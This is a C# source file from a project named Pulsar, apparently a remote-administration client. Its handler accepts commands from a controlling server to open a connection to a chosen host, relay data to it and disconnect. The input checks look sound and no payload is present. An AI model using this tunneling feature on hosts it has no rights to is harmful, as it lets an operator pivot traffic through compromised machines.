using Pulsar.Client.Networking;
using Pulsar.Client.ReverseProxy;
using Pulsar.Common.Messages;
using Pulsar.Common.Messages.Administration.ReverseProxy;
using Pulsar.Common.Messages.Other;
using Pulsar.Common.Networking;
using System;
using Pulsar.Common.Networking;

namespace Pulsar.Client.Messages
{
    public class ReverseProxyHandler : IMessageProcessor
    {
        private readonly PulsarClient _client;

        public ReverseProxyHandler(PulsarClient client)
        {
            _client = client;
        }

        public bool CanExecute(IMessage message) => message is ReverseProxyConnect ||
                                                             message is ReverseProxyData ||
                                                             message is ReverseProxyDisconnect;

        public bool CanExecuteFrom(ISender sender) => true;

        public void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case ReverseProxyConnect msg:
                    Execute(sender, msg);
                    break;
                case ReverseProxyData msg:
                    Execute(sender, msg);
                    break;
                case ReverseProxyDisconnect msg:
                    Execute(sender, msg);
                    break;
            }
        }

        private void Execute(ISender client, ReverseProxyConnect message)
        {
            if (!ReverseProxyValidation.IsValidTarget(message?.Target) ||
                !ReverseProxyValidation.IsValidPort(message?.Port ?? 0) ||
                !ReverseProxyValidation.IsValidId(message?.ListenerSessionId) ||
                !ReverseProxyValidation.IsValidId(message?.TunnelId))
            {
                return;
            }

            _client.ConnectReverseProxy(message);
        }

        private void Execute(ISender client, ReverseProxyData message)
        {
            ReverseProxyClient proxyClient = _client.GetReverseProxyByConnectionId(message.ConnectionId);

            if (proxyClient == null ||
                message.Data == null ||
                !ReverseProxyValidation.IsValidPayloadLength(message.Data.Length) ||
                !string.Equals(proxyClient.ListenerSessionId, message.ListenerSessionId, StringComparison.Ordinal) ||
                !string.Equals(proxyClient.TunnelId, message.TunnelId, StringComparison.Ordinal))
            {
                return;
            }

            proxyClient?.SendToTargetServer(message.Data);
        }
        private void Execute(ISender client, ReverseProxyDisconnect message)
        {
            ReverseProxyClient socksClient = _client.GetReverseProxyByConnectionId(message.ConnectionId);

            if (socksClient == null ||
                !string.Equals(socksClient.ListenerSessionId, message.ListenerSessionId, StringComparison.Ordinal) ||
                !string.Equals(socksClient.TunnelId, message.TunnelId, StringComparison.Ordinal))
            {
                return;
            }

            socksClient?.Disconnect();
        }
    }
}
